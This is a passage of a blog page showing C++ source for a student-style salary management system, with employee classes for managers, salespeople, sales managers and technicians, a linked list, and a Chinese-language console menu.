Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Technician</span>();</span><br><span class="line">	<span class="built_in">Technician</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> t,<span class="type">double</span> h,string ty) :<span class="built_in">Employee_base</span>(i, n, g, d, l, s,ty),<span class="built_in">time</span>(t),<span class="built_in">hourlyWage</span>(h)&#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addtechnician</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> time;<span class="comment">//工作时间</span></span><br><span class="line">	<span class="type">double</span> hourlyWage;<span class="comment">//时薪</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employees</span>:<span class="keyword">virtual</span> <span class="keyword">public</span> Manager, <span class="keyword">virtual</span> <span class="keyword">public</span> Salesperson, <span class="keyword">virtual</span> <span class="keyword">public</span> SalesManager, <span class="keyword">virtual</span> <span class="keyword">public</span> Technician</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">add_employee</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showEmployees</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifyname</span><span class="params">()</span></span>;<span class="comment">//修改姓名</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifygender</span><span class="params">()</span></span>;<span class="comment">//修改性别</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifydepartment</span><span class="params">()</span></span>;<span class="comment">//修改部门</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifylevel</span><span class="params">()</span></span>;<span class="comment">//修改级别</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifysalary</span><span class="params">()</span></span>;<span class="comment">//修改工资</span></span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">saveid</span><span class="params">(<span class="type">int</span> Id)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savename</span><span class="params">(string Name)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savegender</span><span class="params">(string gender)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savedepartment</span><span class="params">(string department)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savelevel</span><span class="params">(string level)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savesalary</span><span class="params">(<span class="type">double</span> salary)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">	Manager m;</span><br><span class="line">	Salesperson	s;</span><br><span class="line">	SalesManager sm;</span><br><span class="line">	Technician t;</span><br><span class="line">	Employees e;</span><br><span class="line">	Node* next;</span><br><span class="line">&#125;Node,*Linklist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ide</span><span class="params">(<span class="type">int</span> Id)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listlength</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear_buffer</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_list</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display_all</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">static_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">()</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="employee-cpp"><a href="#employee-cpp" class="headerlink" title="employee.cpp"></a>employee.cpp</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;employee.h&quot;</span></span></span><br><span class="line">Linklist head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*基类抽象函数*/</span></span><br><span class="line">Employee_base::<span class="built_in">Employee_base</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Employee_base::getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getgender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getdepartment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> department;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getlevel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Employee_base::getsalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//Salary = calculateSalary();</span></span><br><span class="line">	<span class="keyword">return</span> Salary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::gettype</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*派生类构造函数*/</span></span><br><span class="line">Manager::<span class="built_in">Manager</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	MonthSalary = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;经理&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Salesperson::<span class="built_in">Salesperson</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	SalesAmount = <span class="literal">NULL</span>;</span><br><span class="line">	commision = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;销售人员&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">SalesManager::<span class="built_in">SalesManager</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	MonthSalary = <span class="literal">NULL</span>;</span><br><span class="line">	SalesAmount = <span class="literal">NULL</span>;</span><br><span class="line">	commision = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;销售经理&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Technician::<span class="built_in">Technician</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	time = <span class="literal">NULL</span>;</span><br><span class="line">	hourlyWage = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;技术人员&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*派生类成员添加函数*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Manager::addmanager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id=<span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理的月薪：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; MonthSalary;</span><br><span class="line">	Salary = MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Salesperson::addsalesperson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员销售额：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; SalesAmount;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员提成率：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; commision;</span><br><span class="line">	Salary = SalesAmount * commision;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SalesManager::addsalesmanager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理的月薪：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; MonthSalary;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理销售额：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; SalesAmount;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理提成率：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; commision;</span><br><span class="line">	Salary = (SalesAmount * commision)+ MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Technician::addtechnician</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员的时薪：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; hourlyWage;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员的工作时间：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; time;</span><br><span class="line">	Salary = time * hourlyWage;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::add_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*派生类工资计算函数*/</span></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Manager::calculateSalary</span><span class="params">()</span><span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Salesperson::calculateSalary</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> SalesAmount * commision;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">SalesManager::calculateSalary</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (SalesAmount * commision) + MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Technician::calculateSalary</span><span class="params">()</span><span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> hourlyWage * time;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Employees功能函数</span></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Employees::calculateSalary</span><span class="params">()</span><span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;经理&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> Manager::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;销售人员&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> Salesperson::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;销售经理&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> SalesManager::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;技术人员&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> Technician::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::showEmployees</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; gender &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; department &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; level &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; Salary &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::modifyname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要修改的姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifygender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要修改的性别：&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifydepartment</span><span class="params">()</span></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要调换的部门：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifylevel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要更新的级别：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifysalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入修改后工资：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Salary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Employees保存函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::saveid</span><span class="params">( <span class="type">int</span> Id)</span> </span>&#123;</span><br><span class="line">	id = Id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::savename</span><span class="params">(string Name)</span> </span>&#123;</span><br><span class="line">	name = Name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savegender</span><span class="params">(string Gender)</span> </span>&#123;</span><br><span class="line">	gender = Gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savedepartment</span><span class="params">(string Department)</span> </span>&#123;</span><br><span class="line">	department = Department;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savelevel</span><span class="params">(string Level)</span> </span>&#123;</span><br><span class="line">	level = Level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savesalary</span><span class="params">(<span class="type">double</span> salary)</span> </span>&#123;</span><br><span class="line">	Salary = salary;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*功能函数*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listlength</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> length=<span class="number">0</span>;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		length++;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_list</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	head = <span class="keyword">new</span> Node;</span><br><span class="line">	head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear_buffer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> ch;</span><br><span class="line">	<span class="keyword">while</span> ((ch = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; ch != EOF);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> choose;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖          &lt;小型公司工资管理系统设计&gt;           ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              1.  添加职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              2.  查询职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              3.  显示职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              4.  编辑职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              5.  删除职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              6.  统计职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              7.  保存职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              8.  读取职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              0.  结束进程                     ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字执行对应的功能:&quot;</span>;</span><br><span class="line">		choose = <span class="built_in">getchar</span>();</span><br><span class="line">		<span class="built_in">clear_buffer</span>();</span><br><span class="line">		<span class="keyword">switch</span> (choose)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;<span class="comment">//添加职员信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">add_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;<span class="comment">//查询职工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">query_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;<span class="comment">//显示职工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">display_all</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: &#123;<span class="comment">//编辑员工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">modify_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: &#123;<span class="comment">//删除员工信息</span></span><br><span class="line">			<span class="built_in">delete_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>: &#123;<span class="comment">//统计员工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">static_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>: &#123;<span class="comment">//保存员工信息</span></span><br><span class="line">			<span class="built_in">save</span>();</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t\t\t\t保存成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>: &#123;<span class="comment">//读取员工信息</span></span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;读取成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">			<span class="built_in">load</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>: &#123;<span class="comment">//退出</span></span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t\t\t\t**********退出成功！**********&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="built_in">exit</span>(<span 